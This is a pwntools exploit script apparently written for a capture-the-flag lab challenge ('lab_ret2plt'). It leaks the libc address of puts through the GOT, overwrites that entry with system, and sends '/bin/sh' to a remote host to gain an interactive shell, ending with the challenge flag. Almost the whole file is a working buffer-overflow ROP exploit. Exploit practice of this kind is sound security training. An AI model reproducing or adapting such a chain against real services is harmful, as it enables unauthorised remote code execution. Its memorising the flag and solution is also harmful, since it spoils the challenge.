from pwn import *

# ./src/lab_ret2plt/share/chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# 0x0000000000401263 : pop rdi ; ret
# 0x0000000000401261 : pop rsi ; pop r15 ; ret
# 0x000000000040101a : ret

context.arch = 'amd64'

pop_rdi = 0x0000000000401263
pop_rsi_r15 = 0x0000000000401261
# ret = 0x000000000040101a

puts_got = 0x0000000000403368
puts_plt = 0x0000000000401070

gets_plt = 0x0000000000401090

bss = 0x0000000000403000 + 0x800

# ldd ./src/lab_ret2plt/share/chal
#         linux-vdso.so.1 (0x00007ffda0b99000)
#         libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0ef0a00000)
#         /lib64/ld-linux-x86-64.so.2 (0x00007f0ef0c78000)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_offset = -libc.symbols['puts'] + libc.symbols['system']

# p = process('./src/lab_ret2plt/share/chal')
p = remote('10.113.184.121', 10053)

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     p,
#     gdbscript=gdbscript,
# )

rop_chain = flat([
    #
    # puts_got
    pop_rdi,
    puts_got,
    puts_plt,
    #
    # /bin/sh
    pop_rdi,
    bss,
    gets_plt,
    #
    # system
    pop_rdi,
    puts_got,
    gets_plt,
    #
    pop_rdi,
    bss,
    puts_plt,
])

p.recvuntil(b'Try your best :')

payload = b'a' * 0x28 + rop_chain
print(f"{payload = }")
p.sendline(payload)

# boom !
p.recvline()

libc_puts = p.recvline().strip()
libc_puts = u64(libc_puts.ljust(8, b'\x00'))
print(f"{libc_puts = }")

payload_bin_sh = b'/bin/sh\x00'
print(f"{payload_bin_sh = }")
p.sendline(payload_bin_sh)

libc_system = libc_puts + libc_offset
print(f"{libc_system = }")
p.sendline(p64(libc_system))

p.interactive()

# flag{__libc_csu_init_1s_P0w3RFu1l!!}
